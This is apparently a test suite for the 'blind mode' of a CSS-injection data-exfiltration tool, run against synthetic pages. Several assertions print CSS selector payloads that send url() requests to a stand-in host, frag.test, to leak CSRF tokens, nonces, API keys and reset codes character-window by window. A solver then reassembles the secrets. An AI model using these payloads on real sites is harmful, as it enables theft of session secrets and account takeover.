'use strict';

// Blind mode, end to end without a browser: build the real recon/extract rule
// data from public/blind.js, work out which requests it triggers on a model
// page (test/blind-helpers.js), then run the server's recon parsing and the
// unknown-length solver on them. Runs are seeded (FRAG_SEED=<n>).

const test = require('node:test');
const assert = require('node:assert/strict');

const B = require('../public/blind');
const { stitchUnknownLength } = require('../lib/stitch');
const { SEED, rng } = require('./helpers');
const { el, page, requests, reconHits, fieldData } = require('./blind-helpers');

const recon = doc => B.fieldsFromRecon(reconHits(requests(doc, B.reconPayload())));
const WHOLE = new Set(['input', 'meta', 'data']);

function extractOne(doc, field) {
  const payload = B.extractPayload([{ id: 0, ...field }]);
  const data = fieldData(requests(doc, payload)).get(0);
  if (!data) return null;
  return stitchUnknownLength(data, { windowSize: field.windowSize, whole: WHOLE.has(field.kind) });
}

const listed = (res, secret) => Boolean(res) && (res.candidates || [res.token]).includes(secret);
const single = (res, secret) => Boolean(res) && !res.candidates && res.token === secret;

// --- recon -------------------------------------------------------------------

test('recon finds wordlist fields, their hosts and whether they are hex', () => {
  const hex40 = rng(SEED + 100).hex(40);
  const shown = el('form', {});
  const hiddenForm = el('form', {}, { rendered: false });
  const doc = page([
    shown,
    el('input', { type: 'hidden', name: 'Csrf_Token', value: hex40 }, { form: shown }),
    el('input', { type: 'hidden', name: '_wpnonce', value: 'a1b2-x9' }, { form: shown }),
    el('input', { type: 'hidden', name: 'lang', value: 'en' }, { form: shown }),
    // Not a direct child of a form: needs the html host.
    el('input', { type: 'hidden', name: 'authenticity_token', value: 'aGVsbG8=' }),
    // Its form doesn't render, so it can't host either.
    hiddenForm,
    el('input', { type: 'hidden', name: 'nonce', value: 'deadbeef' }, { form: hiddenForm }),
    el('meta', { name: 'csrf-token', content: hex40 }),
    el('meta', { name: 'csrf-param', content: 'authenticity_token' }),
    el('meta', { name: 'viewport', content: 'width=device-width' }),
    el('a', { href: `https://x.test/cb?state=zz&code=${hex40}&op=1` }),
    el('form', { action: `/login?TOKEN=${hex40}` }),
    el('div', { 'data-api-key': hex40 }),
    el('input', { type: 'hidden', 'data-nonce': 'ABCDEF' }),
  ]);

  const { fields, unlistedInputs } = recon(doc);
  // Grouped by kind, in wordlist order.
  assert.deepEqual(fields, [
    { kind: 'input', name: 'csrf_token', host: 'form', hex: true },
    { kind: 'input', name: 'authenticity_token', host: 'html', hex: false },
    { kind: 'input', name: 'nonce', host: 'html', hex: true },
    { kind: 'input', name: '_wpnonce', host: 'form', hex: false },
    { kind: 'meta', name: 'csrf-token', host: 'self', hex: true },
    { kind: 'meta', name: 'csrf-param', host: 'self', hex: false },
    { kind: 'form', name: 'token', host: 'self', hex: null },
    { kind: 'a', name: 'code', host: 'self', hex: null },
    { kind: 'a', name: 'state', host: 'self', hex: null },
    { kind: 'data', name: 'data-api-key', host: 'self', hex: true },
    { kind: 'data', name: 'data-nonce', host: 'html', hex: false },
  ]);
  assert.equal(unlistedInputs, true, '"lang" is not in the wordlist');
});

test('recon with no matching fields reports nothing', () => {
  const doc = page([el('input', { type: 'text', name: 'q', value: 'hello' }), el('a', { href: '/about' })]);
  assert.deepEqual(recon(doc), { fields: [], unlistedInputs: false });
});

test('recon only probes the chosen targets', () => {
  const payload = B.reconPayload({ targets: ['meta'] });
  assert.ok(payload.rules.length > 0);
  assert.ok(payload.rules.every(r => /^r\/m/.test(r.path)), 'only meta probes');
  assert.equal(payload.displayMeta, true);
});

test('wordlists are URL-safe and recon fits on its hosts', () => {
  for (const list of [B.INPUT_NAMES, B.META_NAMES, B.URL_PARAMS, B.DATA_ATTRS]) {
    for (const w of list) assert.match(w, /^[\w-]+$/);
    assert.equal(new Set(list).size, list.length, 'no duplicates');
  }
  for (const w of B.DATA_ATTRS) assert.ok(w.startsWith('data-'), w);
});

// --- rendering -----------------------------------------------------------------

test('rendered CSS has exactly one declaration per rule, with the expected selectors', () => {
  const reconData = B.reconPayload();
  const css = B.render(reconData, 'http://frag.test');
  assert.equal(css.match(/\{--[\w-]+:url\(/g).length, reconData.rules.length);
  assert.ok(css.startsWith('<style>head,meta{display:block}'));
  assert.ok(css.includes('html:has(input[name="csrf" i]){--ra:url(http://frag.test/r/i/csrf)}'));
  assert.ok(css.includes('form:has(>input[name="csrf" i]){--rb:url(http://frag.test/r/if/csrf)}'));
  assert.ok(css.includes('html:has(input[name="csrf" i][value]:not([value=""],[value*="g" i],'));
  assert.ok(css.includes('a:is([href*="?token=" i],[href*="&token=" i]){'));
  assert.ok(css.includes('meta:is([name="csrf-token" i][content]){--'));

  const fields = [
    { id: 0, kind: 'input', name: 'csrf', host: 'form', windowSize: 3 },
    { id: 1, kind: 'input', name: 'nonce', host: 'form', windowSize: 3 },
    { id: 2, kind: 'a', name: 'code', host: 'self', windowSize: 3 },
  ];
  const extract = B.extractPayload(fields);
  const out = B.generateBlindCSS(fields, 'http://frag.test');
  assert.equal(out.match(/\{--[\w-]+:url\(/g).length, extract.rules.length);
  assert.ok(out.includes('form:has(>input[name="csrf" i][value^="00"]){--s0-:url(http://frag.test/b/0/s/00)}'));
  // Self-hosted rules keep their attribute tests inside :is() (much faster
  // for Chrome to build).
  assert.ok(out.includes('a:is([href*="?code=ab" i]){--s2-:url(http://frag.test/b/2/s/ab)}'));
  assert.ok(out.includes('a:is([href*="code=" i][href*="ab&"]){--e2-ab:url(http://frag.test/b/2/e/ab)}'));
  // Both form fields share one `background` on the form.
  assert.equal(out.match(/(^|\})form\{background:/g).length, 1);
  // 4-char windows need the pseudo-elements too.
  const big = B.generateBlindCSS([{ id: 0, kind: 'meta', name: 'csrf-token', host: 'self', windowSize: 4 }], 'http://frag.test');
  assert.ok(big.includes('meta::before{content:"";display:inline-block;background:'));
});

test('extract URLs are namespaced by field and carry no duplicate props', () => {
  const extract = B.extractPayload([
    { id: 0, kind: 'input', name: 'csrf', host: 'html', windowSize: 3 },
    { id: 5, kind: 'data', name: 'data-token', host: 'self', windowSize: 3 },
  ]);
  for (const r of extract.rules) assert.match(r.path, /^b\/(0|5)\/((s|e|r)\/[0-9a-f]{2}|[0-9a-f]{3})$/);
  const windowProps = extract.rules.filter(r => /^b\/\d+\/[0-9a-f]{3}$/.test(r.path)).map(r => r.prop);
  assert.equal(new Set(windowProps).size, windowProps.length);
});

// --- extraction ------------------------------------------------------------------

// Each scenario builds a page with the secret in it and the field recon would
// have reported for it. Lengths are unknown to the solver.
const WHOLE_SCENARIOS = [
  {
    name: 'hidden input, form host',
    field: { kind: 'input', name: 'csrf', host: 'form' },
    doc: (secret, r) => {
      const f = el('form', {});
      return page([
        f,
        el('input', { type: 'hidden', name: 'action', value: 'login' }, { form: f }),
        el('input', { type: 'hidden', name: 'CSRF', value: secret }, { form: f }),
        el('input', { type: 'hidden', name: 'other', value: r.hex(16) }, { form: f }),
      ]);
    },
  },
  {
    name: 'hidden input, html host',
    field: { kind: 'input', name: '_token', host: 'html' },
    doc: (secret, r) => page([
      el('input', { type: 'hidden', name: '_token', value: secret }),
      el('input', { type: 'hidden', name: 'other', value: r.hex(16) }),
    ]),
  },
  {
    name: 'meta',
    field: { kind: 'meta', name: 'csrf-token', host: 'self' },
    doc: (secret, r) => page([
      el('meta', { name: 'csrf-token', content: secret }),
      el('meta', { name: 'build', content: r.hex(12) }),
    ]),
  },
  {
    name: 'data attribute',
    field: { kind: 'data', name: 'data-nonce', host: 'self' },
    doc: (secret, r) => page([el('div', { 'data-nonce': secret, 'data-id': r.hex(8) })]),
  },
];

// 4-char windows usually give one correct answer; when the token repeats a
// substring (e.g. "fffff") the leaked windows can't tell how many times, so
// every fitting length is listed. 3-char windows keep the token listed but
// longer ones are often ambiguous, and very long ones can run out of search
// budget.
const WHOLE_EXPECT = {
  4: { lengths: [6, 64], listed: 1, single: 0.85 },
  3: { lengths: [6, 40], listed: 0.97, single: 0.3 },
};

for (const sc of WHOLE_SCENARIOS) {
  for (const k of [4, 3]) {
    test(`unknown-length extraction: ${sc.name}, ${k}-char windows`, t => {
      const r = rng(SEED + k * 1000 + WHOLE_SCENARIOS.indexOf(sc));
      const { lengths: [min, max], ...expect } = WHOLE_EXPECT[k];
      let runs = 0, listedN = 0, singleN = 0;
      for (let length = min; length <= max; length += 2) {
        const secret = r.hex(length);
        const res = extractOne(sc.doc(secret, r), { ...sc.field, windowSize: k });
        runs++;
        listedN += listed(res, secret);
        singleN += single(res, secret);
      }
      t.diagnostic(`listed ${listedN}/${runs}, single correct guess ${singleN}/${runs}`);
      assert.ok(listedN / runs >= expect.listed, `listed ${listedN}/${runs}`);
      assert.ok(singleN / runs >= expect.single, `single ${singleN}/${runs}`);
    });
  }
}

// URL params: the token sits among other params, with random hex junk before
// and after it. Junk can genuinely make two tokens fit the data equally well
// (a chance overlap lets the token's tail swap with a junk param's), in which
// case both are listed. With 3-char windows those overlaps are common, so the
// token is usually listed among a few candidates rather than alone.
const URL_EXPECT = {
  4: { lengths: [8, 64], listed: 0.97, single: 0.6 },
  3: { lengths: [8, 24], listed: 0.75, single: 0 },
};

for (const kind of ['a', 'form']) {
  for (const k of [4, 3]) {
    test(`unknown-length extraction: ${kind} URL param with hex junk, ${k}-char windows`, t => {
      const r = rng(SEED + k * 2000 + kind.length);
      const { lengths: [min, max], ...expect } = URL_EXPECT[k];
      let runs = 0, listedN = 0, singleN = 0;
      for (let length = min; length <= max; length += 4) {
        for (let i = 0; i < 3; i++) {
          const secret = r.hex(length);
          const url = `https://example.com/m/callback/email?state=${r.hex(r.int(4, 20))}` +
            `&token=${secret}&operation=login&x=${r.hex(r.int(4, 40))}`;
          const doc = page([kind === 'a' ? el('a', { href: url }) : el('form', { action: url })]);
          const res = extractOne(doc, { kind, name: 'token', host: 'self', windowSize: k });
          runs++;
          listedN += listed(res, secret);
          singleN += single(res, secret);
        }
      }
      t.diagnostic(`listed ${listedN}/${runs}, single correct guess ${singleN}/${runs}`);
      assert.ok(listedN / runs >= expect.listed, `listed ${listedN}/${runs}`);
      assert.ok(singleN / runs >= expect.single, `single ${singleN}/${runs}`);
    });
  }
}

test('URL param that is the last thing in the URL', () => {
  const r = rng(SEED + 3000);
  for (const length of [16, 32, 40]) {
    const secret = r.hex(length);
    const doc = page([el('a', { href: `/reset?user=7&code=${secret}` })]);
    const res = extractOne(doc, { kind: 'a', name: 'code', host: 'self', windowSize: 4 });
    assert.ok(listed(res, secret), `${secret}: ${JSON.stringify(res)}`);
  }
});

test('several fields in one payload, including two in the same form', () => {
  const r = rng(SEED + 3001);
  const secrets = [r.hex(40), r.hex(32), r.hex(40), r.hex(24)];
  const f = el('form', {});
  const doc = page([
    f,
    el('input', { type: 'hidden', name: 'csrf', value: secrets[0] }, { form: f }),
    el('input', { type: 'hidden', name: 'nonce', value: secrets[1] }, { form: f }),
    el('meta', { name: 'csrf-token', content: secrets[2] }),
    el('a', { href: `/verify?code=${secrets[3]}&next=home` }),
  ]);
  const fields = [
    { id: 0, kind: 'input', name: 'csrf', host: 'form', windowSize: 4 },
    { id: 1, kind: 'input', name: 'nonce', host: 'form', windowSize: 4 },
    { id: 2, kind: 'meta', name: 'csrf-token', host: 'self', windowSize: 4 },
    { id: 3, kind: 'a', name: 'code', host: 'self', windowSize: 4 },
  ];
  const data = fieldData(requests(doc, B.extractPayload(fields)));
  for (const field of fields) {
    const res = stitchUnknownLength(data.get(field.id), { windowSize: 4, whole: field.kind !== 'a' });
    assert.ok(listed(res, secrets[field.id]), `${field.name}: ${JSON.stringify(res)}`);
  }
});

test('a value that is not pure hex gives no token rather than a wrong one', () => {
  const doc = page([el('meta', { name: 'csrf-token', content: 'deadbeef-cafe-babe-f00d-0123456789ab' })]);
  assert.equal(extractOne(doc, { kind: 'meta', name: 'csrf-token', host: 'self', windowSize: 4 }), null);
});

// --- capacity ----------------------------------------------------------------------

test('fields move to a fallback host when theirs is full, and error when nothing fits', () => {
  const input = (id, name, windowSize = 4) => ({ id, kind: 'input', name, host: 'form', windowSize });
  const two = B.assignHosts([input(0, 'csrf'), input(1, 'nonce')]);
  assert.deepEqual(two.fields.map(f => f.host), ['form', 'html']);
  assert.match(B.assignHosts([input(0, 'csrf'), input(1, 'nonce'), input(2, '_token')]).error, /no room for _token/);
  // Recon put it on html because its form doesn't render: never moved to form.
  assert.deepEqual(B.assignHosts([{ ...input(0, 'csrf'), host: 'html' }]).fields[0].host, 'html');
  // 3-char fields are small enough to share.
  const many = B.INPUT_NAMES.slice(0, 16).map((name, id) => input(id, name, 3));
  assert.ok(B.assignHosts(many).fields.every(f => f.host === 'form'));

  // Both 4-char inputs are still recovered from the page.
  const r = rng(SEED + 4000);
  const secrets = [r.hex(40), r.hex(40)];
  const form = el('form', {});
  const doc = page([
    form,
    el('input', { type: 'hidden', name: 'csrf', value: secrets[0] }, { form }),
    el('input', { type: 'hidden', name: 'nonce', value: secrets[1] }, { form }),
  ]);
  const data = fieldData(requests(doc, B.extractPayload(two.fields)));
  for (const f of two.fields) {
    assert.ok(listed(stitchUnknownLength(data.get(f.id), { windowSize: 4 }), secrets[f.id]), f.name);
  }
});

test('payloads too big for one stylesheet are split below Chrome\'s 2^18 rule limit', () => {
  const fields = B.assignHosts([
    { id: 0, kind: 'input', name: 'csrf', host: 'form', windowSize: 4 },
    { id: 1, kind: 'meta', name: 'csrf-token', host: 'self', windowSize: 4 },
    { id: 2, kind: 'data', name: 'data-api-key', host: 'self', windowSize: 4 },
    { id: 3, kind: 'a', name: 'code', host: 'self', windowSize: 4 },
  ]).fields;
  const css = B.generateBlindCSS(fields, 'http://frag.test');
  const sheets = css.split('</style><style>');
  assert.equal(sheets.length, 2);
  for (const sheet of sheets) assert.ok(sheet.match(/\{/g).length < 2 ** 18);
  assert.equal(css.match(/\{--[\w-]+:url\(/g).length, B.extractPayload(fields).rules.length);
});
